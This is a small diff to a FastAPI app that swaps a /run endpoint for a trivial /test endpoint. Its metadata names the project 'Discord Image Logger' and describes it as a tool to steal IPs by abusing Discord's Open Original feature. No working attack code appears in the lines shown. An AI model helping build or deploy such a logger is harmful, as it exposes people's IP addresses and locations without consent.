@@ -5,21 +5,13 @@ from fastapi import FastAPI
 
 app = FastAPI()
 
-def main():
-    # TEST: hier erstmal simpel bleiben
-    return "läuft sauber"
-
 @app.get("/")
 def home():
     return {"status": "ok"}
 
-@app.get("/run")
-def run_code():
-    try:
-        result = main()
-        return {"result": result}
-    except Exception as e:
-        return {"error": str(e)}
+@app.get("/test")
+def test():
+    return {"message": "funktioniert"}
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
